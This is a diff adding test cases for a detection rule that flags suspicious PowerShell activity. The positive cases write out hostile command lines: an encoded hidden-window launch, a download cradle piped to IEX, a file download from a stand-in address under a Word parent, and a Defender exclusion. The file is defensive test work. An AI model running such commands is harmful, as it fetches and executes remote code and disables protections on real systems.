@@ -1,0 +1,53 @@
+rule: TH-009-suspicious-powershell
+description: >
+  Positives require either defence tampering, two independent behaviours, or a suspicious parent with
+  one behaviour. Negatives are the two most common benign shapes: an interactive admin one-liner and
+  a management agent running a signed script with -NoProfile.
+cases:
+  - name: Encoded hidden-window invocation
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -NoProfile -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Download cradle piped to IEX
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Defender exclusion added from PowerShell
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell.exe Add-MpPreference -ExclusionPath 'C:\\Users\\Public'"
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\adm-jdoe'
+
+  - name: Office parent with a single cradle signal
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell.exe Invoke-WebRequest -Uri http://198.51.100.9/x -OutFile x.exe"
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\winword.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Interactive administrative one-liner
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe Get-Service -Name Spooler | Restart-Service'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'CONTOSO\adm-jdoe'
+
+  - name: Management agent running a signed script with NoProfile only
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -NoProfile -File "C:\Program Files\Contoso\Agent\inventory.ps1"'
+      ParentImage: 'C:\Program Files\Contoso\Agent\agentsvc.exe'
+      User: 'NT AUTHORITY\SYSTEM'
